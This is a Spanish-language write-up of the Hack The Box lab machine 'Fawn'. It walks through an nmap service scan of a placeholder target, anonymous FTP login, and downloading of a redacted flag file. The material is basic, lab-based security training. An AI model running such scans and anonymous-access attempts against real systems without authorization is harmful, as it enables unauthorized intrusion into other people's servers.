+++
title = "Fawn"
description = "Máquina de Starting Point enfocada en enumeración de servicios y acceso mediante FTP."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
    "FTP",
    "Enumeration",
    "Starting Point"
]

image = "/images/writeups/fawn.png"
+++

### Descripción general

**Fawn** es una máquina perteneciente a **Starting Point** de Hack The Box. Está diseñada para practicar conceptos fundamentales de reconocimiento, enumeración de servicios y acceso remoto mediante FTP.

El objetivo consiste en identificar el servicio FTP expuesto, comprobar si permite acceso anónimo y utilizarlo para acceder a los archivos disponibles en el sistema.

---

### Enumeración

Comenzamos realizando un escaneo con **Nmap** para identificar los puertos y servicios disponibles:

```bash
nmap -sC -sV <TARGET_IP>
```

El escaneo muestra el siguiente resultado:

```bash
Starting Nmap 7.95
Nmap scan report for <TARGET_IP>

PORT   STATE SERVICE
21/tcp open  ftp
```

El puerto `21/tcp` se encuentra abierto y corresponde al servicio **FTP**.

Al tratarse de un servicio utilizado para la transferencia de archivos, procedemos a investigar si permite algún tipo de acceso sin autenticación válida.

---

### Acceso inicial

Intentamos conectarnos al servicio FTP:

```bash
ftp <TARGET_IP>
```

El servidor solicita un nombre de usuario:

```bash
Name: anonymous
```

Utilizamos el usuario `anonymous`, que permite acceder al servicio cuando el acceso anónimo se encuentra habilitado:

```bash
anonymous
```

La autenticación se realiza correctamente y obtenemos acceso al servidor FTP:

```bash
230 Login successful.
```

Una vez dentro, podemos interactuar con los archivos disponibles en el servidor.

---

### Bandera

Listamos los archivos disponibles utilizando el comando `ls`:

```bash
ls
```

El servidor contiene un archivo llamado `flag.txt`:

```bash
flag.txt
```

Utilizamos el comando `get` para descargar la bandera a nuestra máquina:

```bash
get flag.txt
```

El archivo se descarga correctamente:

```bash
local: flag.txt remote: flag.txt
```

Finalmente, podemos consultar su contenido:

```bash
cat flag.txt
```

El contenido de la bandera se muestra directamente en la terminal:

```text
<FLAG>
```

Con esto se completa la máquina **Fawn**.

---

### Conclusión

**Fawn** presenta un escenario sencillo basado principalmente en la enumeración de servicios y el acceso mediante FTP.

El proceso seguido fue:

```text
Enumeración
    ↓
Identificación del puerto 21
    ↓
Detección de FTP
    ↓
Acceso anónimo
    ↓
Listado de archivos
    ↓
Descarga de la bandera
```

A pesar de su dificultad **Very Easy**, la máquina permite reforzar la importancia de revisar los servicios expuestos y sus mecanismos de autenticación. En este caso, el acceso anónimo habilitado en FTP permitió acceder directamente a los archivos disponibles en el servidor.

---

### [Estado: Completada](https://labs.hackthebox.com/achievement/machine/3933963/393)

